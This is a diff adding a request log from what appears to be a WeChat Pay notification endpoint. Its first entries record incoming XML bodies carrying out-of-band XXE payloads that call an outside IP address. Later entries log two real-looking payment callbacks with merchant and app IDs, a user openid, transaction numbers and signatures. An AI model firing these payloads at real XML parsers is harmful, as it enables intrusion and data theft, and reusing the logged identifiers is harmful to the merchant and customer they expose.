@@ -1,0 +1,117 @@
+03:16:12|'<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE root [
+<!ENTITY % xxe SYSTEM "http://101.91.62.170:4837/wx_xxe_dbc_os_2019080803_853?aHR0cHM6Ly90ZXN0Lm1pbmdydWktZ3ouY29tL2FwaS9vcmRlci1ub3RpZnk=">
+%xxe;
+]>'
+| GET:array (
+)
+03:16:12|'<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE root [
+<!ENTITY xxe SYSTEM "http://101.91.62.170:4837/wx_xxe_dbc_os_2019080803_853?aHR0cHM6Ly90ZXN0Lm1pbmdydWktZ3ouY29tL2FwaS9vcmRlci1ub3RpZnk=">]>
+<foo><value>&xxe;</value></foo>'
+| GET:array (
+)
+03:26:11|'<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE root [
+<!ENTITY % xxe SYSTEM "http://101.91.62.170:4837/wx_xxe_dbc_os_2019080803_853?aHR0cHM6Ly90ZXN0Lm1pbmdydWktZ3ouY29tL2FwaS9vcmRlci1ub3RpZnk=">
+%xxe;
+]>'
+| GET:array (
+)
+03:26:11|'<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE root [
+<!ENTITY xxe SYSTEM "http://101.91.62.170:4837/wx_xxe_dbc_os_2019080803_853?aHR0cHM6Ly90ZXN0Lm1pbmdydWktZ3ouY29tL2FwaS9vcmRlci1ub3RpZnk=">]>
+<foo><value>&xxe;</value></foo>'
+| GET:array (
+)
+03:35:03|'<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE root [
+<!ENTITY % xxe SYSTEM "http://101.91.62.170:4837/wx_xxe_dbc_os_2019080803_853?aHR0cHM6Ly90ZXN0Lm1pbmdydWktZ3ouY29tL2FwaS9vcmRlci1ub3RpZnk=">
+%xxe;
+]>'
+| GET:array (
+)
+03:35:03|'<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE root [
+<!ENTITY xxe SYSTEM "http://101.91.62.170:4837/wx_xxe_dbc_os_2019080803_853?aHR0cHM6Ly90ZXN0Lm1pbmdydWktZ3ouY29tL2FwaS9vcmRlci1ub3RpZnk=">]>
+<foo><value>&xxe;</value></foo>'
+| GET:array (
+)
+21:19:34|'<xml><appid><![CDATA[wx6be14b9c1bbe7bc0]]></appid>
+<bank_type><![CDATA[CCB_DEBIT]]></bank_type>
+<cash_fee><![CDATA[1]]></cash_fee>
+<fee_type><![CDATA[CNY]]></fee_type>
+<is_subscribe><![CDATA[N]]></is_subscribe>
+<mch_id><![CDATA[1543596541]]></mch_id>
+<nonce_str><![CDATA[5d4c215f247aa]]></nonce_str>
+<openid><![CDATA[oGq4g5ekbVvIikoDx8wppZjMuSSc]]></openid>
+<out_trade_no><![CDATA[266061714066697901401]]></out_trade_no>
+<result_code><![CDATA[SUCCESS]]></result_code>
+<return_code><![CDATA[SUCCESS]]></return_code>
+<sign><![CDATA[4081A93985AFBA0D00BB0753064CDB27]]></sign>
+<time_end><![CDATA[20190808211933]]></time_end>
+<total_fee>1</total_fee>
+<trade_type><![CDATA[JSAPI]]></trade_type>
+<transaction_id><![CDATA[4200000348201908089953525492]]></transaction_id>
+</xml>'
+| GET:array (
+)
+21:19:34|notify  array (
+  'appid' => 'wx6be14b9c1bbe7bc0',
+  'bank_type' => 'CCB_DEBIT',
+  'cash_fee' => '1',
+  'fee_type' => 'CNY',
+  'is_subscribe' => 'N',
+  'mch_id' => '1543596541',
+  'nonce_str' => '5d4c215f247aa',
+  'openid' => 'oGq4g5ekbVvIikoDx8wppZjMuSSc',
+  'out_trade_no' => '266061714066697901401',
+  'result_code' => 'SUCCESS',
+  'return_code' => 'SUCCESS',
+  'sign' => '4081A93985AFBA0D00BB0753064CDB27',
+  'time_end' => '20190808211933',
+  'total_fee' => '1',
+  'trade_type' => 'JSAPI',
+  'transaction_id' => '4200000348201908089953525492',
+)
+| GET:array (
+)
+21:32:14|'<xml><appid><![CDATA[wx6be14b9c1bbe7bc0]]></appid>
+<bank_type><![CDATA[CCB_DEBIT]]></bank_type>
+<cash_fee><![CDATA[1]]></cash_fee>
+<fee_type><![CDATA[CNY]]></fee_type>
+<is_subscribe><![CDATA[N]]></is_subscribe>
+<mch_id><![CDATA[1543596541]]></mch_id>
+<nonce_str><![CDATA[5d4c2457519a7]]></nonce_str>
+<openid><![CDATA[oGq4g5ekbVvIikoDx8wppZjMuSSc]]></openid>
+<out_trade_no><![CDATA[218061861512556101401]]></out_trade_no>
+<result_code><![CDATA[SUCCESS]]></result_code>
+<return_code><![CDATA[SUCCESS]]></return_code>
+<sign><![CDATA[848494F6DAC34860721B2415B51F98A3]]></sign>
+<time_end><![CDATA[20190808213213]]></time_end>
+<total_fee>1</total_fee>
+<trade_type><![CDATA[JSAPI]]></trade_type>
+<transaction_id><![CDATA[4200000344201908087321932610]]></transaction_id>
+</xml>'
+| GET:array (
+)
+21:32:14|notify  array (
+  'appid' => 'wx6be14b9c1bbe7bc0',
+  'bank_type' => 'CCB_DEBIT',
+  'cash_fee' => '1',
+  'fee_type' => 'CNY',
+  'is_subscribe' => 'N',
+  'mch_id' => '1543596541',
+  'nonce_str' => '5d4c2457519a7',
+  'openid' => 'oGq4g5ekbVvIikoDx8wppZjMuSSc',
+  'out_trade_no' => '218061861512556101401',
+  'result_code' => 'SUCCESS',
+  'return_code' => 'SUCCESS',
+  'sign' => '848494F6DAC34860721B2415B51F98A3',
+  'time_end' => '20190808213213',
+  'total_fee' => '1',
+  'trade_type' => 'JSAPI',
+  'transaction_id' => '4200000344201908087321932610',
+)
+| GET:array (
+)
